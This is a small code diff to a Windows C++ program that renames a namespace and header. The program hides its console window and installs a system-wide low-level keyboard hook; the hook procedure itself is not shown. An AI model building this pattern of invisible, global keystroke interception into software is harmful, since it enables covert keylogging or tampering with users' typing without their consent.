@@ -1,14 +1,14 @@
-#include "headers/myKeyboardProcHook.h"
+#include "headers/nMyKeyboardProcHook.h"
 
 int main()
 {
     ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
-    uwuHook::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
-                                             uwuHook::keyBoardProc,
+    UwuHook::keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL,
+                                             UwuHook::keyBoardProc,
                                              nullptr,
                                              NULL
                                              );
     MSG msg{nullptr};
     while (GetMessage(&msg, nullptr, 0, 0) != 0);
-    UnhookWindowsHookEx(uwuHook::keyboardHook);
+    UnhookWindowsHookEx(UwuHook::keyboardHook);
 }
